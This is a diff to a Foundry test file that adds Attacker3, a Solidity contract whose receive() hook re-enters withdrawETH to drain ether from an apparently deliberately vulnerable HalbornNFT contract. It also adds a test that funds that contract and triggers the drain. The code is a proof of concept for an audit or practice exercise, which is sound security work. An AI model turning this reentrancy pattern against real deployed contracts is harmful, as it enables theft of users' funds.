@@ -101,6 +101,87 @@ contract Attacker2 is IERC721ReceiverUpgradeable {
     );
 }
 
+contract Attacker3 is IERC721ReceiverUpgradeable,Test {
+
+    bool public enter = true;
+
+    // Declaring 2 addresses to test
+    address public immutable ALICE = makeAddr("ALICE");
+    address public immutable BOB = makeAddr("BOB");
+
+    // Declaring byte arrays to save the Alice Proof and Bob proof
+    bytes32[] public ALICE_PROOF_1;
+    bytes32[] public ALICE_PROOF_2;
+    bytes32[] public BOB_PROOF_1;
+    bytes32[] public BOB_PROOF_2;
+    bytes32[] public EXAMPLE;
+
+    // Declaring nft, token and loans contracts
+    HalbornNFT public nft2;
+
+    constructor() {
+        // Initialize
+        Merkle m = new Merkle();
+        // Test Data
+        bytes32[] memory data = new bytes32[](4);
+        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
+        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
+        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
+        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));
+
+        // Get Merkle Root
+        bytes32 root = m.getRoot(data);
+
+        // Get Proofs
+        ALICE_PROOF_1 = m.getProof(data, 0);
+        ALICE_PROOF_2 = m.getProof(data, 1);
+        BOB_PROOF_1 = m.getProof(data, 2);
+        BOB_PROOF_2 = m.getProof(data, 3);
+        nft2 = new HalbornNFT();
+        nft2.initialize(root, 1 ether);
+    }
+
+    receive() payable external {
+        console.log("Entering receive() function");
+        // Call the withdrawETH function of the vulnerable HalbornNFT contract
+        //vm.pauseGasMetering();
+        if (address(nft2).balance >= 1 ether) {
+            nft2.withdrawETH(1 ether);
+        }
+    }
+
+    function attack() public {
+        //nft2.mintBuyWithETH{value: 1 ether}();
+        //vm.pauseGasMetering();
+        nft2.withdrawETH(1 ether);
+        console.log(nft2.ownerOf(1));
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+
+        console.log("Entering onERC721Received function in Attack3 contract");
+
+        // Log the receipt of the ERC721 token
+        emit ERC721Received(operator, from, tokenId, data);
+
+        // Return the ERC721_RECEIVED selector as per ERC721 standard
+        return IERC721ReceiverUpgradeable.onERC721Received.selector;
+    }
+    
+    // Event to log the receipt of the ERC721 token
+    event ERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes data
+    );
+}
+
 contract HalbornTest is Test {
     // Declaring 2 addresses to test
     address public immutable ALICE = makeAddr("ALICE");
@@ -115,6 +196,7 @@ contract HalbornTest is Test {
 
     // Declaring nft, token and loans contracts
     HalbornNFT public nft;
+    HalbornNFT public nft2;
     HalbornToken public token;
     HalbornLoans public loans;
 
@@ -155,14 +237,29 @@ contract HalbornTest is Test {
 
     }
 
-    function testmintBuyWithETHOverflow() public {
+
+    function testwithdrawETH() public {
+        Attacker3 attacker3 = new Attacker3();
+        vm.startPrank(BOB);
+        vm.deal(BOB, 5 ether);
+        for (uint256 i=0; i < 5; i++) {
+            attacker3.nft2().mintBuyWithETH{value: 1 ether}();
+        }
+        vm.stopPrank();
+        vm.startPrank(address(attacker3));
+        attacker3.attack();
+        vm.stopPrank();
+        console.log("Ending test function");
+    }
+
+    /*function testmintBuyWithETHOverflow() public {
         Attacker2 attacker2 = new Attacker2();
         vm.startPrank(address(attacker2));
         vm.deal(address(attacker2), 2 ether);
         nft.mintBuyWithETH{value: 1 ether}();
         nft.mintBuyWithETH{value: 1 ether}();
         vm.stopPrank();
-    }
+    }*/
 
     /*function testnftMintAirdrops() public {
         vm.startPrank(BOB);
